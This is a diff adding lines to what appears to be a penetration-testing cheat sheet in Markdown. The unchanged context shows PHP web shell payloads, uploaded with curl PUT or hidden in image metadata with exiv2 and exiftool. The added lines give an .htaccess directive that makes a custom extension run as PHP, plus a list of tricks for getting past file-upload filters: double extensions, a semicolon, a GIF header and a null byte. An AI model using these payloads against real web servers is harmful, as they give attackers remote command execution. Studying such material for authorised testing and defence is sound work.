@@ -182,6 +182,18 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
 exiftool “-comment<=back.php” back.png
 ```
+#### Uploading .htaccess to interpret .blah as .php
+```
+AddType application/x-httpd-php .blah
+```
+
+#### Bypassing File Upload Restrictions
+- file.php -> file.jpg
+- file.php -> file.php.jpg
+- file.asp -> file.asp;.jpg
+- file.gif (contains php code, but starts with string GIF)
+- 00%
+
 
 #### Cracking Passwords
 
